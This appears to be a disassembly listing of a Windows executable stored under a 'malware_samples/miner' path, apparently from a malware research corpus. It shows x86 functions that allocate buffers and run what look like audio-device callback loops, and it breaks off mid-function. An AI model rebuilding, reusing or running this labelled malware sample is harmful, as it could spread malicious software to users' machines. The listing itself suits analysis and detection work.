
malware_samples/miner/d202ed020ed8e36bd8a0f5b571a19d386c12abecb2a28c989d50bbf92c78f54e.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	53                   	push   %ebx
  401001:	55                   	push   %ebp
  401002:	56                   	push   %esi
  401003:	33 db                	xor    %ebx,%ebx
  401005:	57                   	push   %edi
  401006:	8b 3d e8 b1 40 00    	mov    0x40b1e8,%edi
  40100c:	53                   	push   %ebx
  40100d:	8b f1                	mov    %ecx,%esi
  40100f:	53                   	push   %ebx
  401010:	53                   	push   %ebx
  401011:	53                   	push   %ebx
  401012:	c7 06 48 b4 40 00    	movl   $0x40b448,(%esi)
  401018:	ff d7                	call   *%edi
  40101a:	53                   	push   %ebx
  40101b:	53                   	push   %ebx
  40101c:	53                   	push   %ebx
  40101d:	53                   	push   %ebx
  40101e:	89 46 24             	mov    %eax,0x24(%esi)
  401021:	ff d7                	call   *%edi
  401023:	89 46 28             	mov    %eax,0x28(%esi)
  401026:	89 5e 2c             	mov    %ebx,0x2c(%esi)
  401029:	89 5e 1c             	mov    %ebx,0x1c(%esi)
  40102c:	89 5e 20             	mov    %ebx,0x20(%esi)
  40102f:	c7 46 04 e8 03 00 00 	movl   $0x3e8,0x4(%esi)
  401036:	88 5e 44             	mov    %bl,0x44(%esi)
  401039:	88 5e 45             	mov    %bl,0x45(%esi)
  40103c:	8d 7e 30             	lea    0x30(%esi),%edi
  40103f:	bd 02 00 00 00       	mov    $0x2,%ebp
  401044:	8b 46 04             	mov    0x4(%esi),%eax
  401047:	50                   	push   %eax
  401048:	e8 93 96 00 00       	call   0x40a6e0
  40104d:	6a 20                	push   $0x20
  40104f:	89 47 d8             	mov    %eax,-0x28(%edi)
  401052:	e8 89 96 00 00       	call   0x40a6e0
  401057:	89 07                	mov    %eax,(%edi)
  401059:	8b 4e 04             	mov    0x4(%esi),%ecx
  40105c:	51                   	push   %ecx
  40105d:	e8 7e 96 00 00       	call   0x40a6e0
  401062:	6a 20                	push   $0x20
  401064:	89 47 e0             	mov    %eax,-0x20(%edi)
  401067:	e8 74 96 00 00       	call   0x40a6e0
  40106c:	89 47 08             	mov    %eax,0x8(%edi)
  40106f:	83 c4 10             	add    $0x10,%esp
  401072:	83 c7 04             	add    $0x4,%edi
  401075:	4d                   	dec    %ebp
  401076:	75 cc                	jne    0x401044
  401078:	8d 46 46             	lea    0x46(%esi),%eax
  40107b:	33 d2                	xor    %edx,%edx
  40107d:	8b c8                	mov    %eax,%ecx
  40107f:	5f                   	pop    %edi
  401080:	89 11                	mov    %edx,(%ecx)
  401082:	89 51 04             	mov    %edx,0x4(%ecx)
  401085:	89 51 08             	mov    %edx,0x8(%ecx)
  401088:	89 51 0c             	mov    %edx,0xc(%ecx)
  40108b:	89 51 10             	mov    %edx,0x10(%ecx)
  40108e:	66 c7 00 31 00       	movw   $0x31,(%eax)
  401093:	66 c7 46 48 01 00    	movw   $0x1,0x48(%esi)
  401099:	c7 46 4a 40 1f 00 00 	movl   $0x1f40,0x4a(%esi)
  4010a0:	c7 46 4e 59 06 00 00 	movl   $0x659,0x4e(%esi)
  4010a7:	66 c7 46 52 41 00    	movw   $0x41,0x52(%esi)
  4010ad:	66 89 5e 54          	mov    %bx,0x54(%esi)
  4010b1:	66 c7 46 56 02 00    	movw   $0x2,0x56(%esi)
  4010b7:	66 c7 46 58 40 01    	movw   $0x140,0x58(%esi)
  4010bd:	8b c6                	mov    %esi,%eax
  4010bf:	5e                   	pop    %esi
  4010c0:	5d                   	pop    %ebp
  4010c1:	5b                   	pop    %ebx
  4010c2:	c3                   	ret
  4010c3:	90                   	nop
  4010c4:	90                   	nop
  4010c5:	90                   	nop
  4010c6:	90                   	nop
  4010c7:	90                   	nop
  4010c8:	90                   	nop
  4010c9:	90                   	nop
  4010ca:	90                   	nop
  4010cb:	90                   	nop
  4010cc:	90                   	nop
  4010cd:	90                   	nop
  4010ce:	90                   	nop
  4010cf:	90                   	nop
  4010d0:	56                   	push   %esi
  4010d1:	8b f1                	mov    %ecx,%esi
  4010d3:	e8 18 00 00 00       	call   0x4010f0
  4010d8:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  4010dd:	74 09                	je     0x4010e8
  4010df:	56                   	push   %esi
  4010e0:	e8 01 96 00 00       	call   0x40a6e6
  4010e5:	83 c4 04             	add    $0x4,%esp
  4010e8:	8b c6                	mov    %esi,%eax
  4010ea:	5e                   	pop    %esi
  4010eb:	c2 04 00             	ret    $0x4
  4010ee:	90                   	nop
  4010ef:	90                   	nop
  4010f0:	53                   	push   %ebx
  4010f1:	55                   	push   %ebp
  4010f2:	56                   	push   %esi
  4010f3:	8b f1                	mov    %ecx,%esi
  4010f5:	57                   	push   %edi
  4010f6:	8a 46 44             	mov    0x44(%esi),%al
  4010f9:	c7 06 48 b4 40 00    	movl   $0x40b448,(%esi)
  4010ff:	84 c0                	test   %al,%al
  401101:	74 49                	je     0x40114c
  401103:	8b 46 18             	mov    0x18(%esi),%eax
  401106:	50                   	push   %eax
  401107:	ff 15 f0 b3 40 00    	call   *0x40b3f0
  40110d:	8b 4e 18             	mov    0x18(%esi),%ecx
  401110:	51                   	push   %ecx
  401111:	ff 15 d0 b3 40 00    	call   *0x40b3d0
  401117:	8b 2d d4 b3 40 00    	mov    0x40b3d4,%ebp
  40111d:	8d 7e 30             	lea    0x30(%esi),%edi
  401120:	bb 02 00 00 00       	mov    $0x2,%ebx
  401125:	8b 17                	mov    (%edi),%edx
  401127:	8b 46 18             	mov    0x18(%esi),%eax
  40112a:	6a 20                	push   $0x20
  40112c:	52                   	push   %edx
  40112d:	50                   	push   %eax
  40112e:	ff d5                	call   *%ebp
  401130:	83 c7 04             	add    $0x4,%edi
  401133:	4b                   	dec    %ebx
  401134:	75 ef                	jne    0x401125
  401136:	8b 4e 18             	mov    0x18(%esi),%ecx
  401139:	51                   	push   %ecx
  40113a:	ff 15 d8 b3 40 00    	call   *0x40b3d8
  401140:	8b 56 2c             	mov    0x2c(%esi),%edx
  401143:	6a ff                	push   $0xffffffff
  401145:	52                   	push   %edx
  401146:	ff 15 e0 b1 40 00    	call   *0x40b1e0
  40114c:	8a 46 45             	mov    0x45(%esi),%al
  40114f:	84 c0                	test   %al,%al
  401151:	74 33                	je     0x401186
  401153:	8b 46 40             	mov    0x40(%esi),%eax
  401156:	50                   	push   %eax
  401157:	ff 15 dc b3 40 00    	call   *0x40b3dc
  40115d:	8b 2d e0 b3 40 00    	mov    0x40b3e0,%ebp
  401163:	8d 7e 30             	lea    0x30(%esi),%edi
  401166:	bb 02 00 00 00       	mov    $0x2,%ebx
  40116b:	8b 0f                	mov    (%edi),%ecx
  40116d:	8b 56 40             	mov    0x40(%esi),%edx
  401170:	6a 20                	push   $0x20
  401172:	51                   	push   %ecx
  401173:	52                   	push   %edx
  401174:	ff d5                	call   *%ebp
  401176:	83 c7 04             	add    $0x4,%edi
  401179:	4b                   	dec    %ebx
  40117a:	75 ef                	jne    0x40116b
  40117c:	8b 46 40             	mov    0x40(%esi),%eax
  40117f:	50                   	push   %eax
  401180:	ff 15 f4 b3 40 00    	call   *0x40b3f4
  401186:	8d 7e 30             	lea    0x30(%esi),%edi
  401189:	bb 02 00 00 00       	mov    $0x2,%ebx
  40118e:	8b 4f d8             	mov    -0x28(%edi),%ecx
  401191:	51                   	push   %ecx
  401192:	e8 4f 95 00 00       	call   0x40a6e6
  401197:	8b 17                	mov    (%edi),%edx
  401199:	52                   	push   %edx
  40119a:	e8 47 95 00 00       	call   0x40a6e6
  40119f:	8b 47 e0             	mov    -0x20(%edi),%eax
  4011a2:	50                   	push   %eax
  4011a3:	e8 3e 95 00 00       	call   0x40a6e6
  4011a8:	8b 4f 08             	mov    0x8(%edi),%ecx
  4011ab:	51                   	push   %ecx
  4011ac:	e8 35 95 00 00       	call   0x40a6e6
  4011b1:	83 c4 10             	add    $0x10,%esp
  4011b4:	83 c7 04             	add    $0x4,%edi
  4011b7:	4b                   	dec    %ebx
  4011b8:	75 d4                	jne    0x40118e
  4011ba:	8b 56 24             	mov    0x24(%esi),%edx
  4011bd:	8b 3d e4 b1 40 00    	mov    0x40b1e4,%edi
  4011c3:	52                   	push   %edx
  4011c4:	ff d7                	call   *%edi
  4011c6:	8b 46 28             	mov    0x28(%esi),%eax
  4011c9:	50                   	push   %eax
  4011ca:	ff d7                	call   *%edi
  4011cc:	8b 4e 2c             	mov    0x2c(%esi),%ecx
  4011cf:	51                   	push   %ecx
  4011d0:	ff d7                	call   *%edi
  4011d2:	5f                   	pop    %edi
  4011d3:	5e                   	pop    %esi
  4011d4:	5d                   	pop    %ebp
  4011d5:	5b                   	pop    %ebx
  4011d6:	c3                   	ret
  4011d7:	90                   	nop
  4011d8:	90                   	nop
  4011d9:	90                   	nop
  4011da:	90                   	nop
  4011db:	90                   	nop
  4011dc:	90                   	nop
  4011dd:	90                   	nop
  4011de:	90                   	nop
  4011df:	90                   	nop
  4011e0:	56                   	push   %esi
  4011e1:	8b f1                	mov    %ecx,%esi
  4011e3:	57                   	push   %edi
  4011e4:	8a 46 44             	mov    0x44(%esi),%al
  4011e7:	84 c0                	test   %al,%al
  4011e9:	75 10                	jne    0x4011fb
  4011eb:	e8 d0 00 00 00       	call   0x4012c0
  4011f0:	84 c0                	test   %al,%al
  4011f2:	75 07                	jne    0x4011fb
  4011f4:	5f                   	pop    %edi
  4011f5:	33 c0                	xor    %eax,%eax
  4011f7:	5e                   	pop    %esi
  4011f8:	c2 04 00             	ret    $0x4
  4011fb:	8b 7c 24 0c          	mov    0xc(%esp),%edi
  4011ff:	85 ff                	test   %edi,%edi
  401201:	75 07                	jne    0x40120a
  401203:	5f                   	pop    %edi
  401204:	33 c0                	xor    %eax,%eax
  401206:	5e                   	pop    %esi
  401207:	c2 04 00             	ret    $0x4
  40120a:	8b 46 28             	mov    0x28(%esi),%eax
  40120d:	50                   	push   %eax
  40120e:	ff 15 d8 b1 40 00    	call   *0x40b1d8
  401214:	8b 4e 24             	mov    0x24(%esi),%ecx
  401217:	6a ff                	push   $0xffffffff
  401219:	51                   	push   %ecx
  40121a:	ff 15 dc b1 40 00    	call   *0x40b1dc
  401220:	8b 56 04             	mov    0x4(%esi),%edx
  401223:	89 17                	mov    %edx,(%edi)
  401225:	8b 46 1c             	mov    0x1c(%esi),%eax
  401228:	5f                   	pop    %edi
  401229:	8b 44 86 08          	mov    0x8(%esi,%eax,4),%eax
  40122d:	5e                   	pop    %esi
  40122e:	c2 04 00             	ret    $0x4
  401231:	90                   	nop
  401232:	90                   	nop
  401233:	90                   	nop
  401234:	90                   	nop
  401235:	90                   	nop
  401236:	90                   	nop
  401237:	90                   	nop
  401238:	90                   	nop
  401239:	90                   	nop
  40123a:	90                   	nop
  40123b:	90                   	nop
  40123c:	90                   	nop
  40123d:	90                   	nop
  40123e:	90                   	nop
  40123f:	90                   	nop
  401240:	53                   	push   %ebx
  401241:	8b d9                	mov    %ecx,%ebx
  401243:	8a 43 45             	mov    0x45(%ebx),%al
  401246:	84 c0                	test   %al,%al
  401248:	75 0d                	jne    0x401257
  40124a:	e8 41 01 00 00       	call   0x401390
  40124f:	84 c0                	test   %al,%al
  401251:	75 04                	jne    0x401257
  401253:	5b                   	pop    %ebx
  401254:	c2 08 00             	ret    $0x8
  401257:	8b 44 24 0c          	mov    0xc(%esp),%eax
  40125b:	55                   	push   %ebp
  40125c:	33 ed                	xor    %ebp,%ebp
  40125e:	85 c0                	test   %eax,%eax
  401260:	76 4e                	jbe    0x4012b0
  401262:	8b 4b 04             	mov    0x4(%ebx),%ecx
  401265:	56                   	push   %esi
  401266:	57                   	push   %edi
  401267:	8b 43 20             	mov    0x20(%ebx),%eax
  40126a:	8b 74 24 14          	mov    0x14(%esp),%esi
  40126e:	8b d1                	mov    %ecx,%edx
  401270:	6a 20                	push   $0x20
  401272:	8b 7c 83 10          	mov    0x10(%ebx,%eax,4),%edi
  401276:	c1 e9 02             	shr    $0x2,%ecx
  401279:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  40127b:	8b ca                	mov    %edx,%ecx
  40127d:	83 e1 03             	and    $0x3,%ecx
  401280:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  401282:	8b 43 20             	mov    0x20(%ebx),%eax
  401285:	8b 53 40             	mov    0x40(%ebx),%edx
  401288:	8b 4c 83 38          	mov    0x38(%ebx,%eax,4),%ecx
  40128c:	51                   	push   %ecx
  40128d:	52                   	push   %edx
  40128e:	ff 15 c8 b3 40 00    	call   *0x40b3c8
  401294:	8b 73 20             	mov    0x20(%ebx),%esi
  401297:	8b 4b 04             	mov    0x4(%ebx),%ecx
  40129a:	b8 01 00 00 00       	mov    $0x1,%eax
  40129f:	03 e9                	add    %ecx,%ebp
  4012a1:	2b c6                	sub    %esi,%eax
  4012a3:	89 43 20             	mov    %eax,0x20(%ebx)
  4012a6:	8b 44 24 18          	mov    0x18(%esp),%eax
  4012aa:	3b e8                	cmp    %eax,%ebp
  4012ac:	72 b9                	jb     0x401267
  4012ae:	5f                   	pop    %edi
  4012af:	5e                   	pop    %esi
  4012b0:	5d                   	pop    %ebp
  4012b1:	b0 01                	mov    $0x1,%al
  4012b3:	5b                   	pop    %ebx
  4012b4:	c2 08 00             	ret    $0x8
  4012b7:	90                   	nop
  4012b8:	90                   	nop
  4012b9:	90                   	nop
  4012ba:	90                   	nop
  4012bb:	90                   	nop
  4012bc:	90                   	nop
  4012bd:	90                   	nop
  4012be:	90                   	nop
  4012bf:	90                   	nop
  4012c0:	51                   	push   %ecx
  4012c1:	53                   	push   %ebx
  4012c2:	57                   	push   %edi
  4012c3:	8b f9                	mov    %ecx,%edi
  4012c5:	ff 15 cc b3 40 00    	call   *0x40b3cc
  4012cb:	85 c0                	test   %eax,%eax
  4012cd:	75 06                	jne    0x4012d5
  4012cf:	5f                   	pop    %edi
  4012d0:	32 c0                	xor    %al,%al
  4012d2:	5b                   	pop    %ebx
  4012d3:	59                   	pop    %ecx
  4012d4:	c3                   	ret
  4012d5:	8d 44 24 08          	lea    0x8(%esp),%eax
  4012d9:	c7 44 24 08 00 00 00 	movl   $0x0,0x8(%esp)
  4012e0:	00 
  4012e1:	50                   	push   %eax
  4012e2:	6a 04                	push   $0x4
  4012e4:	57                   	push   %edi
  4012e5:	68 30 14 40 00       	push   $0x401430
  4012ea:	6a 00                	push   $0x0
  4012ec:	6a 00                	push   $0x0
  4012ee:	ff 15 ec b0 40 00    	call   *0x40b0ec
  4012f4:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  4012f8:	68 00 00 02 00       	push   $0x20000
  4012fd:	6a 00                	push   $0x0
  4012ff:	8d 57 46             	lea    0x46(%edi),%edx
  401302:	51                   	push   %ecx
  401303:	8d 5f 18             	lea    0x18(%edi),%ebx
  401306:	52                   	push   %edx
  401307:	68 ff ff 00 00       	push   $0xffff
  40130c:	53                   	push   %ebx
  40130d:	89 47 2c             	mov    %eax,0x2c(%edi)
  401310:	ff 15 b8 b3 40 00    	call   *0x40b3b8
  401316:	85 c0                	test   %eax,%eax
  401318:	74 06                	je     0x401320
  40131a:	5f                   	pop    %edi
  40131b:	32 c0                	xor    %al,%al
  40131d:	5b                   	pop    %ebx
  40131e:	59                   	pop    %ecx
  40131f:	c3                   	ret
  401320:	55                   	push   %ebp
  401321:	56                   	push   %esi
  401322:	8d 77 30             	lea    0x30(%edi),%esi
  401325:	bd 02 00 00 00       	mov    $0x2,%ebp
  40132a:	8b 06                	mov    (%esi),%eax
  40132c:	8b 4e d8             	mov    -0x28(%esi),%ecx
  40132f:	6a 20                	push   $0x20
  401331:	89 08                	mov    %ecx,(%eax)
  401333:	8b 16                	mov    (%esi),%edx
  401335:	8b 47 04             	mov    0x4(%edi),%eax
  401338:	89 42 04             	mov    %eax,0x4(%edx)
  40133b:	8b 0e                	mov    (%esi),%ecx
  40133d:	33 c0                	xor    %eax,%eax
  40133f:	89 41 10             	mov    %eax,0x10(%ecx)
  401342:	8b 16                	mov    (%esi),%edx
  401344:	89 42 14             	mov    %eax,0x14(%edx)
  401347:	8b 06                	mov    (%esi),%eax
  401349:	8b 0b                	mov    (%ebx),%ecx
  40134b:	50                   	push   %eax
  40134c:	51                   	push   %ecx
  40134d:	ff 15 bc b3 40 00    	call   *0x40b3bc
  401353:	83 c6 04             	add    $0x4,%esi
  401356:	4d                   	dec    %ebp
  401357:	75 d1                	jne    0x40132a
  401359:	8b 57 1c             	mov    0x1c(%edi),%edx
  40135c:	8b 0b                	mov    (%ebx),%ecx
  40135e:	6a 20                	push   $0x20
  401360:	8b 44 97 30          	mov    0x30(%edi,%edx,4),%eax
  401364:	50                   	push   %eax
  401365:	51                   	push   %ecx
  401366:	ff 15 c0 b3 40 00    	call   *0x40b3c0
  40136c:	8b 57 2c             	mov    0x2c(%edi),%edx
  40136f:	52                   	push   %edx
  401370:	ff 15 b0 b1 40 00    	call   *0x40b1b0
  401376:	8b 03                	mov    (%ebx),%eax
  401378:	50                   	push   %eax
  401379:	ff 15 c4 b3 40 00    	call   *0x40b3c4
  40137f:	b0 01                	mov    $0x1,%al
  401381:	5e                   	pop    %esi
  401382:	88 47 44             	mov    %al,0x44(%edi)
  401385:	5d                   	pop    %ebp
  401386:	5f                   	pop    %edi
  401387:	5b                   	pop    %ebx
  401388:	59                   	pop    %ecx
  401389:	c3                   	ret
  40138a:	90                   	nop
  40138b:	90                   	nop
  40138c:	90                   	nop
  40138d:	90                   	nop
  40138e:	90                   	nop
  40138f:	90                   	nop
  401390:	53                   	push   %ebx
  401391:	55                   	push   %ebp
  401392:	56                   	push   %esi
  401393:	57                   	push   %edi
  401394:	8b d9                	mov    %ecx,%ebx
  401396:	ff 15 ec b3 40 00    	call   *0x40b3ec
  40139c:	85 c0                	test   %eax,%eax
  40139e:	75 07                	jne    0x4013a7
  4013a0:	5f                   	pop    %edi
  4013a1:	5e                   	pop    %esi
  4013a2:	5d                   	pop    %ebp
  4013a3:	32 c0                	xor    %al,%al
  4013a5:	5b                   	pop    %ebx
  4013a6:	c3                   	ret
  4013a7:	8d 53 10             	lea    0x10(%ebx),%edx
  4013aa:	be 02 00 00 00       	mov    $0x2,%esi
  4013af:	8b 4b 04             	mov    0x4(%ebx),%ecx
  4013b2:	8b 3a                	mov    (%edx),%edi
  4013b4:	8b e9                	mov    %ecx,%ebp
  4013b6:	33 c0                	xor    %eax,%eax
  4013b8:	c1 e9 02             	shr    $0x2,%ecx
  4013bb:	f3 ab                	rep stos %eax,%es:(%edi)
  4013bd:	8b cd                	mov    %ebp,%ecx
  4013bf:	83 c2 04             	add    $0x4,%edx
  4013c2:	83 e1 03             	and    $0x3,%ecx
  4013c5:	4e                   	dec    %esi
  4013c6:	f3 aa                	rep stos %al,%es:(%edi)
  4013c8:	75 e5                	jne    0x4013af
  4013ca:	6a 00                	push   $0x0
  4013cc:	6a 00                	push   $0x0
  4013ce:	8d 43 46             	lea    0x46(%ebx),%eax
  4013d1:	6a 00                	push   $0x0
  4013d3:	8d 6b 40             	lea    0x40(%ebx),%ebp
  4013d6:	50                   	push   %eax
  4013d7:	68 ff ff 00 00       	push   $0xffff
  4013dc:	55                   	push   %ebp
  4013dd:	ff 15 e8 b3 40 00    	call   *0x40b3e8
  4013e3:	85 c0                	test   %eax,%eax
  4013e5:	74 07                	je     0x4013ee
  4013e7:	5f                   	pop    %edi
  4013e8:	5e                   	pop    %esi
  4013e9:	5d                   	pop    %ebp
  4013ea:	32 c0                	xor    %al,%al
  4013ec:	5b                   	pop    %ebx
  4013ed:	c3                   	ret
  4013ee:	8d 73 38             	lea    0x38(%ebx),%esi
  4013f1:	bf 02 00 00 00       	mov    $0x2,%edi
  4013f6:	8b 0e                	mov    (%esi),%ecx
  4013f8:	8b 56 d8             	mov    -0x28(%esi),%edx
  4013fb:	6a 20                	push   $0x20
  4013fd:	89 11                	mov    %edx,(%ecx)
  4013ff:	8b 06                	mov    (%esi),%eax
  401401:	8b 4b 04             	mov    0x4(%ebx),%ecx
  401404:	89 48 04             	mov    %ecx,0x4(%eax)
  401407:	8b 16                	mov    (%esi),%edx
  401409:	33 c0                	xor    %eax,%eax
  40140b:	89 42 10             	mov    %eax,0x10(%edx)
  40140e:	8b 0e                	mov    (%esi),%ecx
  401410:	89 41 14             	mov    %eax,0x14(%ecx)
  401413:	8b 16                	mov    (%esi),%edx
  401415:	8b 45 00             	mov    0x0(%ebp),%eax
  401418:	52                   	push   %edx
  401419:	50                   	push   %eax
  40141a:	ff 15 e4 b3 40 00    	call   *0x40b3e4
  401420:	83 c6 04             	add    $0x4,%esi
  401423:	4f                   	dec    %edi
  401424:	75 d0                	jne    0x4013f6
  401426:	b0 01                	mov    $0x1,%al
  401428:	5f                   	pop    %edi
  401429:	5e                   	pop    %esi
  40142a:	88 43 45             	mov    %al,0x45(%ebx)
  40142d:	5d                   	pop    %ebp
  40142e:	5b                   	pop    %ebx
  40142f:	c3                   	ret
  401430:	83 ec 1c             	sub    $0x1c,%esp
  401433:	8d 44 24 00          	lea    0x0(%esp),%eax
  401437:	53                   	push   %ebx
  401438:	55                   	push   %ebp
  401439:	56                   	push   %esi
  40143a:	57                   	push   %edi
  40143b:	6a 00                	push   $0x0
  40143d:	6a 00                	push   $0x0
  40143f:	6a 00                	push   $0x0
  401441:	50                   	push   %eax
  401442:	ff 15 7c b3 40 00    	call   *0x40b37c
  401448:	85 c0                	test   %eax,%eax
  40144a:	0f 84 81 00 00 00    	je     0x4014d1
  401450:	8b 74 24 30          	mov    0x30(%esp),%esi
  401454:	8b 3d d8 b1 40 00    	mov    0x40b1d8,%edi
  40145a:	8b 1d dc b1 40 00    	mov    0x40b1dc,%ebx
  401460:	8b 2d c0 b3 40 00    	mov    0x40b3c0,%ebp
  401466:	81 7c 24 14 c0 03 00 	cmpl   $0x3c0,0x14(%esp)
  40146d:	00 
  40146e:	75 2c                	jne    0x40149c
  401470:	8b 4e 24             	mov    0x24(%esi),%ecx
  401473:	51                   	push   %ecx
  401474:	ff d7                	call   *%edi
  401476:	8b 56 28             	mov    0x28(%esi),%edx
  401479:	6a ff                	push   $0xffffffff
  40147b:	52                   	push   %edx
  40147c:	ff d3                	call   *%ebx
  40147e:	8b 4e 1c             	mov    0x1c(%esi),%ecx
  401481:	b8 01 00 00 00       	mov    $0x1,%eax
  401486:	2b c1                	sub    %ecx,%eax
  401488:	8b 4e 18             	mov    0x18(%esi),%ecx
  40148b:	89 46 1c             	mov    %eax,0x1c(%esi)
  40148e:	6a 20                	push   $0x20
  401490:	8b 44 86 30          	mov    0x30(%esi,%eax,4),%eax
  401494:	50                   	push   %eax
  401495:	51                   	push   %ecx
  401496:	ff d5                	call   *%ebp
  401498:	85 c0                	test   %eax,%eax
  40149a:	75 41                	jne    0x4014dd
  40149c:	81 7c 24 14 bf 03 00 	cmpl   $0x3bf,0x14(%esp)
  4014a3:	00 
  4014a4:	74 2b                	je     0x4014d1
  4014a6:	8d 54 24 10          	lea    0x10(%esp),%edx
  4014aa:	52                   	push   %edx
  4014ab:	ff 15 70 b3 40 00    	call   *0x40b370
  4014b1:	8d 44 24 10          	lea    0x10(%esp),%eax
  4014b5:	50                   	push   %eax
  4014b6:	ff 15 6c b3 40 00    	call   *0x40b36c
  4014bc:	6a 00                	push   $0x0
  4014be:	6a 00                	push   $0x0
  4014c0:	8d 4c 24 18          	lea    0x18(%esp),%ecx
  4014c4:	6a 00                	push   $0x0
  4014c6:	51                   	push   %ecx
  4014c7:	ff 15 7c b3 40 00    	call   *0x40b37c
  4014cd:	85 c0                	test   %eax,%eax
  4014cf:	75 95                	jne    0x401466
  4014d1:	5f                   	pop    %edi
  4014d2:	5e                   	pop    %esi
  4014d3:	5d                   	pop    %ebp
  4014d4:	33 c0                	xor    %eax,%eax
  4014d6:	5b                   	pop    %ebx
  4014d7:	83 c4 1c             	add    $0x1c,%esp
  4014da:	c2 04 00             	ret    $0x4
  4014dd:	5f                   	pop    %edi
  4014de:	5e                   	pop    %esi
  4014df:	5d                   	pop    %ebp
  4014e0:	83 c8 ff             	or     $0xffffffff,%eax
  4014e3:	5b                   	pop    %ebx
  4014e4:	83 c4 1c             	add    $0x1c,%esp
  4014e7:	c2 04 00             	ret    $0x4
  4014ea:	90                   	nop
  4014eb:	90                   	nop
  4014ec:	90                   	nop
  4014ed:	90                   	nop
  4014ee:	90                   	nop
  4014ef:	90                   	nop
  4014f0:	6a ff                	push   $0xffffffff
  4014f2:	68 a8 a9 40 00       	push   $0x40a9a8
  4014f7:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4014fd:	50                   	push   %eax
  4014fe:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  401505:	51                   	push   %ecx
  401506:	8b 44 24 14          	mov    0x14(%esp),%eax
  40150a:	56                   	push   %esi
  40150b:	8b f1                	mov    %ecx,%esi
  40150d:	50                   	push   %eax
  40150e:	89 74 24 08          	mov    %esi,0x8(%esp)
  401512:	e8 09 4a 00 00       	call   0x405f20
  401517:	8b ce                	mov    %esi,%ecx
  401519:	c7 44 24 10 00 00 00 	movl   $0x0,0x10(%esp)
  401520:	00 
  401521:	c7 06 4c b4 40 00    	movl   $0x40b44c,(%esi)
  401527:	e8 e4 00 00 00       	call   0x401610
  40152c:	84 c0                	test   %al,%al
  40152e:	74 35                	je     0x401565
  401530:	8d 4c 24 18          	lea    0x18(%esp),%ecx
  401534:	6a 01                	push   $0x1
  401536:	51                   	push   %ecx
  401537:	8b ce                	mov    %esi,%ecx
  401539:	c6 44 24 20 79       	movb   $0x79,0x20(%esp)
  40153e:	e8 5d 4a 00 00       	call   0x405fa0
  401543:	8b ce                	mov    %esi,%ecx
  401545:	e8 c6 4a 00 00       	call   0x406010
  40154a:	6a 00                	push   $0x0
  40154c:	6a 00                	push   $0x0
  40154e:	6a 00                	push   $0x0
  401550:	56                   	push   %esi
  401551:	68 70 17 40 00       	push   $0x401770
  401556:	6a 00                	push   $0x0
  401558:	6a 00                	push   $0x0
  40155a:	e8 11 80 00 00       	call   0x409570
  40155f:	83 c4 1c             	add    $0x1c,%esp
  401562:	89 46 14             	mov    %eax,0x14(%esi)
  401565:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  401569:	8b c6                	mov    %esi,%eax
  40156b:	5e                   	pop    %esi
  40156c:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  401573:	83 c4 10             	add    $0x10,%esp
  401576:	c2 04 00             	ret    $0x4
  401579:	90                   	nop
  40157a:	90                   	nop
  40157b:	90                   	nop
  40157c:	90                   	nop
  40157d:	90                   	nop
  40157e:	90                   	nop
  40157f:	90                   	nop
  401580:	56                   	push   %esi
  401581:	8b f1                	mov    %ecx,%esi
  401583:	e8 18 00 00 00       	call   0x4015a0
  401588:	f6 44 24 08 01       	testb  $0x1,0x8(%esp)
  40158d:	74 09                	je     0x401598
  40158f:	56                   	push   %esi
  401590:	e8 51 91 00 00       	call   0x40a6e6
  401595:	83 c4 04             	add    $0x4,%esp
  401598:	8b c6                	mov    %esi,%eax
  40159a:	5e                   	pop    %esi
  40159b:	c2 04 00             	ret    $0x4
  40159e:	90                   	nop
  40159f:	90                   	nop
  4015a0:	6a ff                	push   $0xffffffff
  4015a2:	68 c8 a9 40 00       	push   $0x40a9c8
  4015a7:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  4015ad:	50                   	push   %eax
  4015ae:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  4015b5:	51                   	push   %ecx
  4015b6:	56                   	push   %esi
  4015b7:	8b f1                	mov    %ecx,%esi
  4015b9:	89 74 24 04          	mov    %esi,0x4(%esp)
  4015bd:	c7 06 4c b4 40 00    	movl   $0x40b44c,(%esi)
  4015c3:	c6 05 24 e7 40 00 00 	movb   $0x0,0x40e724
  4015ca:	8b 46 14             	mov    0x14(%esi),%eax
  4015cd:	6a ff                	push   $0xffffffff
  4015cf:	50                   	push   %eax
  4015d0:	c7 44 24 18 00 00 00 	movl   $0x0,0x18(%esp)
  4015d7:	00 
  4015d8:	ff 15 dc b1 40 00    	call   *0x40b1dc
  4015de:	8b 4e 10             	mov    0x10(%esi),%ecx
  4015e1:	85 c9                	test   %ecx,%ecx
  4015e3:	74 06                	je     0x4015eb
  4015e5:	8b 11                	mov    (%ecx),%edx
  4015e7:	6a 01                	push   $0x1
  4015e9:	ff 12                	call   *(%edx)
  4015eb:	8b ce                	mov    %esi,%ecx
  4015ed:	c7 44 24 10 ff ff ff 	movl   $0xffffffff,0x10(%esp)
  4015f4:	ff 
  4015f5:	e8 76 49 00 00       	call   0x405f70
  4015fa:	8b 4c 24 08          	mov    0x8(%esp),%ecx
  4015fe:	5e                   	pop    %esi
  4015ff:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  401606:	83 c4 10             	add    $0x10,%esp
  401609:	c3                   	ret
  40160a:	90                   	nop
  40160b:	90                   	nop
  40160c:	90                   	nop
  40160d:	90                   	nop
  40160e:	90                   	nop
  40160f:	90                   	nop
  401610:	6a ff                	push   $0xffffffff
  401612:	68 eb a9 40 00       	push   $0x40a9eb
  401617:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  40161d:	50                   	push   %eax
  40161e:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  401625:	51                   	push   %ecx
  401626:	56                   	push   %esi
  401627:	8b f1                	mov    %ecx,%esi
  401629:	ff 15 cc b3 40 00    	call   *0x40b3cc
  40162f:	85 c0                	test   %eax,%eax
  401631:	75 12                	jne    0x401645
  401633:	32 c0                	xor    %al,%al
  401635:	5e                   	pop    %esi
  401636:	8b 4c 24 04          	mov    0x4(%esp),%ecx
